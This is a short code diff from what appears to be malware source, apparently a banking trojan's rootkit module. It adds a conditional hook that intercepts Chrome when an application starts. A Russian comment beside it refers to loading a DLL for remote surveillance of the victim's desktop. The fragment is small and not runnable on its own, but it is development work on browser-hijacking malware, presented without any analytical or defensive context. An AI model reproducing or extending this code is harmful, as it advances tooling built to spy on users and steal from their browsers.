@@ -472,6 +472,15 @@ void RootkitDoStartApplication(TEventData *Data, DWORD AppHash)
 		}
     #endif
 
+	#ifdef ChromeH  
+		if (InitialzeChrome(AppHash))
+		{  
+			BrowserStarted(Data);
+			return;
+		}
+
+	#endif
+
 	//  подгрузка длл которая позволяет удаленно следить за рабочим столом
 	#ifdef PokerH
 		if (IsPoker()) 	return;
